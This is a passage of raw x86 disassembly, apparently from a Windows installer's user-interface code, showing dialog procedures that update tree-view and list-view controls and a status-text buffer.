  4050b1:	eb 18                	jmp    0x4050cb
  4050b3:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4050b6:	50                   	push   %eax
  4050b7:	53                   	push   %ebx
  4050b8:	68 00 11 00 00       	push   $0x1100
  4050bd:	ff 75 fc             	push   -0x4(%ebp)
  4050c0:	ff d6                	call   *%esi
  4050c2:	8b 0d 50 09 42 00    	mov    0x420950,%ecx
  4050c8:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  4050cb:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4050ce:	47                   	inc    %edi
  4050cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4050d5:	3b 3d 8c 43 42 00    	cmp    0x42438c,%edi
  4050db:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4050de:	0f 8c 45 ff ff ff    	jl     0x405029
  4050e4:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4050e7:	75 19                	jne    0x405102
  4050e9:	6a f0                	push   $0xfffffff0
  4050eb:	ff 75 fc             	push   -0x4(%ebp)
  4050ee:	ff 15 c0 81 40 00    	call   *0x4081c0
  4050f4:	24 fb                	and    $0xfb,%al
  4050f6:	50                   	push   %eax
  4050f7:	6a f0                	push   $0xfffffff0
  4050f9:	ff 75 fc             	push   -0x4(%ebp)
  4050fc:	ff 15 2c 82 40 00    	call   *0x40822c
  405102:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  405105:	75 18                	jne    0x40511f
  405107:	6a 05                	push   $0x5
  405109:	ff 75 f8             	push   -0x8(%ebp)
  40510c:	ff 15 14 82 40 00    	call   *0x408214
  405112:	ff 75 f8             	push   -0x8(%ebp)
  405115:	e8 c0 f3 ff ff       	call   0x4044da
  40511a:	e9 89 03 00 00       	jmp    0x4054a8
  40511f:	ff 75 fc             	push   -0x4(%ebp)
  405122:	e8 b3 f3 ff ff       	call   0x4044da
  405127:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  40512e:	75 12                	jne    0x405142
  405130:	33 c9                	xor    %ecx,%ecx
  405132:	89 5d 10             	mov    %ebx,0x10(%ebp)
  405135:	41                   	inc    %ecx
  405136:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40513d:	89 4d 14             	mov    %ecx,0x14(%ebp)
  405140:	eb 03                	jmp    0x405145
  405142:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405145:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  405149:	b8 13 04 00 00       	mov    $0x413,%eax
  40514e:	74 09                	je     0x405159
  405150:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405153:	0f 85 e4 00 00 00    	jne    0x40523d
  405159:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40515c:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40515f:	74 0d                	je     0x40516e
  405161:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  405168:	0f 85 cf 00 00 00    	jne    0x40523d
  40516e:	f6 05 79 43 42 00 02 	testb  $0x2,0x424379
  405175:	75 73                	jne    0x4051ea
  405177:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40517a:	74 09                	je     0x405185
  40517c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40517f:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  405183:	75 65                	jne    0x4051ea
  405185:	33 c9                	xor    %ecx,%ecx
  405187:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40518a:	0f 95 c1             	setne  %cl
  40518d:	51                   	push   %ecx
  40518e:	ff 75 fc             	push   -0x4(%ebp)
  405191:	e8 62 fc ff ff       	call   0x404df8
  405196:	8b f8                	mov    %eax,%edi
  405198:	3b fb                	cmp    %ebx,%edi
  40519a:	7c 4e                	jl     0x4051ea
  40519c:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  4051a2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4051a5:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  4051a9:	8b 01                	mov    (%ecx),%eax
  4051ab:	a8 10                	test   $0x10,%al
  4051ad:	75 3b                	jne    0x4051ea
  4051af:	a8 40                	test   $0x40,%al
  4051b1:	74 11                	je     0x4051c4
  4051b3:	35 80 00 00 00       	xor    $0x80,%eax
  4051b8:	84 c0                	test   %al,%al
  4051ba:	79 04                	jns    0x4051c0
  4051bc:	0c 01                	or     $0x1,%al
  4051be:	eb 07                	jmp    0x4051c7
  4051c0:	24 fe                	and    $0xfe,%al
  4051c2:	eb 03                	jmp    0x4051c7
  4051c4:	83 f0 01             	xor    $0x1,%eax
  4051c7:	57                   	push   %edi
  4051c8:	89 01                	mov    %eax,(%ecx)
  4051ca:	e8 ae bf ff ff       	call   0x40117d
  4051cf:	a1 78 43 42 00       	mov    0x424378,%eax
  4051d4:	47                   	inc    %edi
  4051d5:	f7 d0                	not    %eax
  4051d7:	c1 e8 08             	shr    $0x8,%eax
  4051da:	83 e0 01             	and    $0x1,%eax
  4051dd:	89 7d 10             	mov    %edi,0x10(%ebp)
  4051e0:	89 45 14             	mov    %eax,0x14(%ebp)
  4051e3:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4051ea:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4051ed:	74 4e                	je     0x40523d
  4051ef:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4051f2:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  4051f9:	75 0e                	jne    0x405209
  4051fb:	ff 70 5c             	push   0x5c(%eax)
  4051fe:	53                   	push   %ebx
  4051ff:	68 19 04 00 00       	push   $0x419
  405204:	ff 75 fc             	push   -0x4(%ebp)
  405207:	ff d6                	call   *%esi
  405209:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40520c:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  405213:	75 28                	jne    0x40523d
  405215:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  405219:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40521c:	8b 40 5c             	mov    0x5c(%eax),%eax
  40521f:	75 0f                	jne    0x405230
  405221:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  405227:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  40522b:	83 08 20             	orl    $0x20,(%eax)
  40522e:	eb 0d                	jmp    0x40523d
  405230:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  405236:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  40523a:	83 20 df             	andl   $0xffffffdf,(%eax)
  40523d:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405244:	75 6f                	jne    0x4052b5
  405246:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  40524c:	0f 85 56 02 00 00    	jne    0x4054a8
  405252:	8b 45 10             	mov    0x10(%ebp),%eax
  405255:	c1 e8 10             	shr    $0x10,%eax
  405258:	66 3d 01 00          	cmp    $0x1,%ax
  40525c:	0f 85 46 02 00 00    	jne    0x4054a8
  405262:	53                   	push   %ebx
  405263:	53                   	push   %ebx
  405264:	68 47 01 00 00       	push   $0x147
  405269:	ff 75 f8             	push   -0x8(%ebp)
  40526c:	ff d6                	call   *%esi
  40526e:	83 f8 ff             	cmp    $0xffffffff,%eax
  405271:	0f 84 31 02 00 00    	je     0x4054a8
  405277:	53                   	push   %ebx
  405278:	50                   	push   %eax
  405279:	68 50 01 00 00       	push   $0x150
  40527e:	ff 75 f8             	push   -0x8(%ebp)
  405281:	ff d6                	call   *%esi
  405283:	8b f8                	mov    %eax,%edi
  405285:	83 ff ff             	cmp    $0xffffffff,%edi
  405288:	74 08                	je     0x405292
  40528a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40528d:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  405290:	75 03                	jne    0x405295
  405292:	6a 20                	push   $0x20
  405294:	5f                   	pop    %edi
  405295:	57                   	push   %edi
  405296:	e8 fe bf ff ff       	call   0x401299
  40529b:	57                   	push   %edi
  40529c:	53                   	push   %ebx
  40529d:	68 20 04 00 00       	push   $0x420
  4052a2:	ff 75 08             	push   0x8(%ebp)
  4052a5:	ff d6                	call   *%esi
  4052a7:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  4052ab:	89 5d 14             	mov    %ebx,0x14(%ebp)
  4052ae:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4052b5:	b8 00 02 00 00       	mov    $0x200,%eax
  4052ba:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4052bd:	75 08                	jne    0x4052c7
  4052bf:	53                   	push   %ebx
  4052c0:	53                   	push   %ebx
  4052c1:	50                   	push   %eax
  4052c2:	ff 75 fc             	push   -0x4(%ebp)
  4052c5:	ff d6                	call   *%esi
  4052c7:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4052ce:	75 32                	jne    0x405302
  4052d0:	a1 3c 09 42 00       	mov    0x42093c,%eax
  4052d5:	3b c3                	cmp    %ebx,%eax
  4052d7:	74 07                	je     0x4052e0
  4052d9:	50                   	push   %eax
  4052da:	ff 15 34 80 40 00    	call   *0x408034
  4052e0:	a1 50 09 42 00       	mov    0x420950,%eax
  4052e5:	3b c3                	cmp    %ebx,%eax
  4052e7:	74 07                	je     0x4052f0
  4052e9:	50                   	push   %eax
  4052ea:	ff 15 08 81 40 00    	call   *0x408108
  4052f0:	89 1d 3c 09 42 00    	mov    %ebx,0x42093c
  4052f6:	89 1d 50 09 42 00    	mov    %ebx,0x420950
  4052fc:	89 1d c0 43 42 00    	mov    %ebx,0x4243c0
  405302:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  405309:	0f 85 5b 01 00 00    	jne    0x40546a
  40530f:	53                   	push   %ebx
  405310:	53                   	push   %ebx
  405311:	e8 d9 be ff ff       	call   0x4011ef
  405316:	8b 45 10             	mov    0x10(%ebp),%eax
  405319:	3b c3                	cmp    %ebx,%eax
  40531b:	74 0e                	je     0x40532b
  40531d:	83 f8 ff             	cmp    $0xffffffff,%eax
  405320:	74 01                	je     0x405323
  405322:	48                   	dec    %eax
  405323:	50                   	push   %eax
  405324:	6a 08                	push   $0x8
  405326:	e8 4d fb ff ff       	call   0x404e78
  40532b:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  40532e:	74 3f                	je     0x40536f
  405330:	ff 35 50 09 42 00    	push   0x420950
  405336:	e8 a7 bf ff ff       	call   0x4012e2
  40533b:	8b f8                	mov    %eax,%edi
  40533d:	57                   	push   %edi
  40533e:	e8 56 bf ff ff       	call   0x401299
  405343:	33 c0                	xor    %eax,%eax
  405345:	33 c9                	xor    %ecx,%ecx
  405347:	3b fb                	cmp    %ebx,%edi
  405349:	7e 0e                	jle    0x405359
  40534b:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40534e:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  405351:	74 01                	je     0x405354
  405353:	41                   	inc    %ecx
  405354:	40                   	inc    %eax
  405355:	3b c7                	cmp    %edi,%eax
  405357:	7c f2                	jl     0x40534b
  405359:	53                   	push   %ebx
  40535a:	51                   	push   %ecx
  40535b:	68 4e 01 00 00       	push   $0x14e
  405360:	ff 75 f8             	push   -0x8(%ebp)
  405363:	ff d6                	call   *%esi
  405365:	89 7d 14             	mov    %edi,0x14(%ebp)
  405368:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  40536f:	53                   	push   %ebx
  405370:	53                   	push   %ebx
  405371:	e8 79 be ff ff       	call   0x4011ef
  405376:	a1 50 09 42 00       	mov    0x420950,%eax
  40537b:	39 1d 8c 43 42 00    	cmp    %ebx,0x42438c
  405381:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405384:	a1 88 43 42 00       	mov    0x424388,%eax
  405389:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  405390:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  405393:	0f 8e 9c 00 00 00    	jle    0x405435
  405399:	8d 78 08             	lea    0x8(%eax),%edi
  40539c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40539f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4053a2:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  4053a5:	3b c3                	cmp    %ebx,%eax
  4053a7:	74 74                	je     0x40541d
  4053a9:	8b 0f                	mov    (%edi),%ecx
  4053ab:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4053ae:	f6 c5 01             	test   $0x1,%ch
  4053b1:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  4053b8:	74 11                	je     0x4053cb
  4053ba:	8d 47 10             	lea    0x10(%edi),%eax
  4053bd:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  4053c4:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4053c7:	80 67 01 fe          	andb   $0xfe,0x1(%edi)
  4053cb:	f6 c1 40             	test   $0x40,%cl
  4053ce:	74 05                	je     0x4053d5
  4053d0:	6a 03                	push   $0x3
  4053d2:	58                   	pop    %eax
  4053d3:	eb 0e                	jmp    0x4053e3
  4053d5:	8b c1                	mov    %ecx,%eax
  4053d7:	83 e0 01             	and    $0x1,%eax
  4053da:	40                   	inc    %eax
  4053db:	f6 c1 10             	test   $0x10,%cl
  4053de:	74 03                	je     0x4053e3
  4053e0:	83 c0 03             	add    $0x3,%eax
  4053e3:	8b d1                	mov    %ecx,%edx
  4053e5:	ff 75 bc             	push   -0x44(%ebp)
  4053e8:	c1 e0 0b             	shl    $0xb,%eax
  4053eb:	83 e2 08             	and    $0x8,%edx
  4053ee:	0b c2                	or     %edx,%eax
  4053f0:	8b d1                	mov    %ecx,%edx
  4053f2:	c1 f9 05             	sar    $0x5,%ecx
  4053f5:	03 c0                	add    %eax,%eax
  4053f7:	83 e2 20             	and    $0x20,%edx
  4053fa:	83 e1 01             	and    $0x1,%ecx
  4053fd:	0b c2                	or     %edx,%eax
  4053ff:	41                   	inc    %ecx
  405400:	89 45 c0             	mov    %eax,-0x40(%ebp)
  405403:	51                   	push   %ecx
  405404:	68 02 11 00 00       	push   $0x1102
  405409:	ff 75 fc             	push   -0x4(%ebp)
  40540c:	ff d6                	call   *%esi
  40540e:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405411:	50                   	push   %eax
  405412:	53                   	push   %ebx
  405413:	68 0d 11 00 00       	push   $0x110d
  405418:	ff 75 fc             	push   -0x4(%ebp)
  40541b:	ff d6                	call   *%esi
  40541d:	ff 45 ec             	incl   -0x14(%ebp)
  405420:	81 c7 18 04 00 00    	add    $0x418,%edi
  405426:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405429:	3b 05 8c 43 42 00    	cmp    0x42438c,%eax
  40542f:	0f 8c 67 ff ff ff    	jl     0x40539c
  405435:	66 81 3d 1e 44 42 00 	cmpw   $0x400,0x42441e
  40543c:	00 04 
  40543e:	75 0c                	jne    0x40544c
  405440:	6a 01                	push   $0x1
  405442:	53                   	push   %ebx
  405443:	ff 75 fc             	push   -0x4(%ebp)
  405446:	ff 15 40 82 40 00    	call   *0x408240
  40544c:	a1 3c 3b 42 00       	mov    0x423b3c,%eax
  405451:	39 58 10             	cmp    %ebx,0x10(%eax)
  405454:	74 14                	je     0x40546a
  405456:	6a 05                	push   $0x5
  405458:	e8 6e f9 ff ff       	call   0x404dcb
  40545d:	50                   	push   %eax
  40545e:	6a fb                	push   $0xfffffffb
  405460:	68 ff 03 00 00       	push   $0x3ff
  405465:	e8 49 f9 ff ff       	call   0x404db3
  40546a:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  405471:	75 35                	jne    0x4054a8
  405473:	f6 05 79 43 42 00 01 	testb  $0x1,0x424379
  40547a:	74 2c                	je     0x4054a8
  40547c:	33 c0                	xor    %eax,%eax
  40547e:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  405482:	8b 35 14 82 40 00    	mov    0x408214,%esi
  405488:	0f 94 c0             	sete   %al
  40548b:	c1 e0 03             	shl    $0x3,%eax
  40548e:	8b f8                	mov    %eax,%edi
  405490:	57                   	push   %edi
  405491:	ff 75 fc             	push   -0x4(%ebp)
  405494:	ff d6                	call   *%esi
  405496:	57                   	push   %edi
  405497:	68 fe 03 00 00       	push   $0x3fe
  40549c:	ff 75 08             	push   0x8(%ebp)
  40549f:	ff 15 28 82 40 00    	call   *0x408228
  4054a5:	50                   	push   %eax
  4054a6:	ff d6                	call   *%esi
  4054a8:	ff 75 14             	push   0x14(%ebp)
  4054ab:	ff 75 10             	push   0x10(%ebp)
  4054ae:	ff 75 0c             	push   0xc(%ebp)
  4054b1:	e8 56 f0 ff ff       	call   0x40450c
  4054b6:	5f                   	pop    %edi
  4054b7:	5e                   	pop    %esi
  4054b8:	5b                   	pop    %ebx
  4054b9:	c9                   	leave
  4054ba:	c2 10 00             	ret    $0x10
  4054bd:	55                   	push   %ebp
  4054be:	8b ec                	mov    %esp,%ebp
  4054c0:	53                   	push   %ebx
  4054c1:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4054c4:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4054ca:	57                   	push   %edi
  4054cb:	75 14                	jne    0x4054e1
  4054cd:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4054d1:	75 59                	jne    0x40552c
  4054d3:	68 13 04 00 00       	push   $0x413
  4054d8:	e8 14 f0 ff ff       	call   0x4044f1
  4054dd:	33 c0                	xor    %eax,%eax
  4054df:	eb 62                	jmp    0x405543
  4054e1:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4054e7:	75 20                	jne    0x405509
  4054e9:	ff 75 08             	push   0x8(%ebp)
  4054ec:	ff 15 a0 81 40 00    	call   *0x4081a0
  4054f2:	85 c0                	test   %eax,%eax
  4054f4:	74 36                	je     0x40552c
  4054f6:	6a 01                	push   $0x1
  4054f8:	ff 75 08             	push   0x8(%ebp)
  4054fb:	e8 f8 f8 ff ff       	call   0x404df8
  405500:	8b f8                	mov    %eax,%edi
  405502:	bb 19 04 00 00       	mov    $0x419,%ebx
  405507:	eb 03                	jmp    0x40550c
  405509:	8b 7d 14             	mov    0x14(%ebp),%edi
  40550c:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  405512:	75 1b                	jne    0x40552f
  405514:	39 3d 44 09 42 00    	cmp    %edi,0x420944
  40551a:	74 13                	je     0x40552f
  40551c:	57                   	push   %edi
  40551d:	6a 06                	push   $0x6
  40551f:	89 3d 44 09 42 00    	mov    %edi,0x420944
  405525:	e8 4e f9 ff ff       	call   0x404e78
  40552a:	eb 03                	jmp    0x40552f
  40552c:	8b 7d 14             	mov    0x14(%ebp),%edi
  40552f:	57                   	push   %edi
  405530:	ff 75 10             	push   0x10(%ebp)
  405533:	53                   	push   %ebx
  405534:	ff 75 08             	push   0x8(%ebp)
  405537:	ff 35 4c 09 42 00    	push   0x42094c
  40553d:	ff 15 a4 81 40 00    	call   *0x4081a4
  405543:	5f                   	pop    %edi
  405544:	5b                   	pop    %ebx
  405545:	5d                   	pop    %ebp
  405546:	c2 10 00             	ret    $0x10
  405549:	55                   	push   %ebp
  40554a:	8b ec                	mov    %esp,%ebp
  40554c:	83 ec 30             	sub    $0x30,%esp
  40554f:	a1 44 3b 42 00       	mov    0x423b44,%eax
  405554:	53                   	push   %ebx
  405555:	33 db                	xor    %ebx,%ebx
  405557:	56                   	push   %esi
  405558:	3b c3                	cmp    %ebx,%eax
  40555a:	57                   	push   %edi
  40555b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40555e:	0f 84 b0 00 00 00    	je     0x405614
  405564:	a1 14 44 42 00       	mov    0x424414,%eax
  405569:	be 38 01 42 00       	mov    $0x420138,%esi
  40556e:	8b f8                	mov    %eax,%edi
  405570:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405573:	83 e7 01             	and    $0x1,%edi
  405576:	75 09                	jne    0x405581
  405578:	ff 75 08             	push   0x8(%ebp)
  40557b:	56                   	push   %esi
  40557c:	e8 17 0f 00 00       	call   0x406498
  405581:	56                   	push   %esi
  405582:	e8 94 0e 00 00       	call   0x40641b
  405587:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40558a:	89 45 08             	mov    %eax,0x8(%ebp)
  40558d:	74 1b                	je     0x4055aa
  40558f:	ff 75 0c             	push   0xc(%ebp)
  405592:	e8 84 0e 00 00       	call   0x40641b
  405597:	03 45 08             	add    0x8(%ebp),%eax
  40559a:	3d 00 08 00 00       	cmp    $0x800,%eax
  40559f:	73 73                	jae    0x405614
  4055a1:	ff 75 0c             	push   0xc(%ebp)
  4055a4:	56                   	push   %esi
  4055a5:	e8 77 0e 00 00       	call   0x406421
  4055aa:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4055ae:	75 0d                	jne    0x4055bd
  4055b0:	56                   	push   %esi
  4055b1:	ff 35 28 3b 42 00    	push   0x423b28
  4055b7:	ff 15 08 82 40 00    	call   *0x408208
  4055bd:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4055c1:	75 44                	jne    0x405607
  4055c3:	53                   	push   %ebx
  4055c4:	53                   	push   %ebx
  4055c5:	68 04 10 00 00       	push   $0x1004
  4055ca:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4055cd:	ff 75 fc             	push   -0x4(%ebp)
  4055d0:	8b 35 44 82 40 00    	mov    0x408244,%esi
  4055d6:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4055dd:	ff d6                	call   *%esi
  4055df:	2b c7                	sub    %edi,%eax
  4055e1:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4055e4:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4055e7:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4055ea:	50                   	push   %eax
  4055eb:	b8 07 10 00 00       	mov    $0x1007,%eax
  4055f0:	2b c7                	sub    %edi,%eax
  4055f2:	53                   	push   %ebx
  4055f3:	50                   	push   %eax
  4055f4:	ff 75 fc             	push   -0x4(%ebp)
  4055f7:	ff d6                	call   *%esi
  4055f9:	53                   	push   %ebx
  4055fa:	ff 75 d4             	push   -0x2c(%ebp)
  4055fd:	68 13 10 00 00       	push   $0x1013
  405602:	ff 75 fc             	push   -0x4(%ebp)
  405605:	ff d6                	call   *%esi
  405607:	3b fb                	cmp    %ebx,%edi
  405609:	74 09                	je     0x405614
  40560b:	8b 45 08             	mov    0x8(%ebp),%eax
  40560e:	88 98 38 01 42 00    	mov    %bl,0x420138(%eax)
  405614:	5f                   	pop    %edi
  405615:	5e                   	pop    %esi
  405616:	5b                   	pop    %ebx
  405617:	c9                   	leave
  405618:	c2 08 00             	ret    $0x8
  40561b:	56                   	push   %esi
  40561c:	8b 35 88 43 42 00    	mov    0x424388,%esi
  405622:	57                   	push   %edi
  405623:	8b 3d 8c 43 42 00    	mov    0x42438c,%edi
  405629:	6a 00                	push   $0x0
  40562b:	ff 15 80 82 40 00    	call   *0x408280
  405631:	09 05 20 44 42 00    	or     %eax,0x424420
  405637:	6a 00                	push   $0x0
  405639:	e8 b3 ee ff ff       	call   0x4044f1
  40563e:	85 ff                	test   %edi,%edi
  405640:	74 2b                	je     0x40566d
  405642:	83 c6 0c             	add    $0xc,%esi
  405645:	4f                   	dec    %edi
  405646:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  40564a:	74 0f                	je     0x40565b
  40564c:	ff 74 24 0c          	push   0xc(%esp)
  405650:	ff 36                	push   (%esi)
  405652:	e8 32 bd ff ff       	call   0x401389
  405657:	85 c0                	test   %eax,%eax
  405659:	75 0c                	jne    0x405667
  40565b:	81 c6 18 04 00 00    	add    $0x418,%esi
  405661:	85 ff                	test   %edi,%edi
  405663:	75 e0                	jne    0x405645
  405665:	eb 06                	jmp    0x40566d
  405667:	ff 05 ec 43 42 00    	incl   0x4243ec
  40566d:	68 04 04 00 00       	push   $0x404
  405672:	e8 7a ee ff ff       	call   0x4044f1
  405677:	ff 15 7c 82 40 00    	call   *0x40827c
  40567d:	a1 ec 43 42 00       	mov    0x4243ec,%eax
  405682:	5f                   	pop    %edi
  405683:	5e                   	pop    %esi
  405684:	c2 04 00             	ret    $0x4
  405687:	55                   	push   %ebp
  405688:	8b ec                	mov    %esp,%ebp
  40568a:	83 ec 3c             	sub    $0x3c,%esp
  40568d:	a1 44 3b 42 00       	mov    0x423b44,%eax
  405692:	53                   	push   %ebx
  405693:	56                   	push   %esi
  405694:	57                   	push   %edi
  405695:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405698:	33 db                	xor    %ebx,%ebx
  40569a:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  4056a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4056a3:	0f 85 89 01 00 00    	jne    0x405832
  4056a9:	83 4d d4 ff          	orl    $0xffffffff,-0x2c(%ebp)
  4056ad:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  4056b1:	6a 02                	push   $0x2
  4056b3:	33 c0                	xor    %eax,%eax
  4056b5:	5e                   	pop    %esi
  4056b6:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  4056b9:	89 75 cc             	mov    %esi,-0x34(%ebp)
  4056bc:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4056bf:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4056c2:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  4056c5:	ab                   	stos   %eax,%es:(%edi)
  4056c6:	ab                   	stos   %eax,%es:(%edi)
  4056c7:	a1 70 43 42 00       	mov    0x424370,%eax
  4056cc:	8b 3d 28 82 40 00    	mov    0x408228,%edi
  4056d2:	68 03 04 00 00       	push   $0x403
  4056d7:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4056da:	8b 40 60             	mov    0x60(%eax),%eax
  4056dd:	ff 75 08             	push   0x8(%ebp)
  4056e0:	89 4d 10             	mov    %ecx,0x10(%ebp)
  4056e3:	89 45 0c             	mov    %eax,0xc(%ebp)
  4056e6:	ff d7                	call   *%edi
  4056e8:	68 ee 03 00 00       	push   $0x3ee
  4056ed:	a3 30 3b 42 00       	mov    %eax,0x423b30
  4056f2:	ff 75 08             	push   0x8(%ebp)
  4056f5:	ff d7                	call   *%edi
  4056f7:	68 f8 03 00 00       	push   $0x3f8
  4056fc:	a3 28 3b 42 00       	mov    %eax,0x423b28
  405701:	ff 75 08             	push   0x8(%ebp)
  405704:	ff d7                	call   *%edi
  405706:	ff 35 30 3b 42 00    	push   0x423b30
  40570c:	a3 44 3b 42 00       	mov    %eax,0x423b44
  405711:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405714:	e8 c1 ed ff ff       	call   0x4044da
  405719:	6a 04                	push   $0x4
  40571b:	e8 ab f6 ff ff       	call   0x404dcb
  405720:	a3 34 3b 42 00       	mov    %eax,0x423b34
  405725:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405728:	50                   	push   %eax
  405729:	89 1d 4c 3b 42 00    	mov    %ebx,0x423b4c
  40572f:	ff 75 fc             	push   -0x4(%ebp)
  405732:	ff 15 50 82 40 00    	call   *0x408250
  405738:	56                   	push   %esi
  405739:	ff 15 84 81 40 00    	call   *0x408184
  40573f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405742:	8b 35 44 82 40 00    	mov    0x408244,%esi
  405748:	2b c8                	sub    %eax,%ecx
  40574a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40574d:	50                   	push   %eax
  40574e:	53                   	push   %ebx
  40574f:	68 1b 10 00 00       	push   $0x101b
  405754:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  405757:	ff 75 fc             	push   -0x4(%ebp)
  40575a:	ff d6                	call   *%esi
  40575c:	b8 00 40 00 00       	mov    $0x4000,%eax
  405761:	50                   	push   %eax
  405762:	50                   	push   %eax
  405763:	68 36 10 00 00       	push   $0x1036
  405768:	ff 75 fc             	push   -0x4(%ebp)
  40576b:	ff d6                	call   *%esi
  40576d:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  405770:	7c 1c                	jl     0x40578e
  405772:	ff 75 10             	push   0x10(%ebp)
  405775:	53                   	push   %ebx
  405776:	68 01 10 00 00       	push   $0x1001
  40577b:	ff 75 fc             	push   -0x4(%ebp)
  40577e:	ff d6                	call   *%esi
  405780:	ff 75 10             	push   0x10(%ebp)
  405783:	53                   	push   %ebx
  405784:	68 26 10 00 00       	push   $0x1026
  405789:	ff 75 fc             	push   -0x4(%ebp)
  40578c:	ff d6                	call   *%esi
  40578e:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405791:	7c 0e                	jl     0x4057a1
  405793:	ff 75 0c             	push   0xc(%ebp)
  405796:	53                   	push   %ebx
  405797:	68 24 10 00 00       	push   $0x1024
  40579c:	ff 75 fc             	push   -0x4(%ebp)
  40579f:	ff d6                	call   *%esi
  4057a1:	8b 45 14             	mov    0x14(%ebp),%eax
  4057a4:	ff 70 30             	push   0x30(%eax)
  4057a7:	6a 1b                	push   $0x1b
  4057a9:	ff 75 08             	push   0x8(%ebp)
  4057ac:	e8 f4 ec ff ff       	call   0x4044a5
  4057b1:	f6 05 78 43 42 00 03 	testb  $0x3,0x424378
  4057b8:	74 34                	je     0x4057ee
  4057ba:	53                   	push   %ebx
  4057bb:	ff 35 30 3b 42 00    	push   0x423b30
  4057c1:	ff 15 14 82 40 00    	call   *0x408214
  4057c7:	f6 05 78 43 42 00 02 	testb  $0x2,0x424378
  4057ce:	75 0d                	jne    0x4057dd
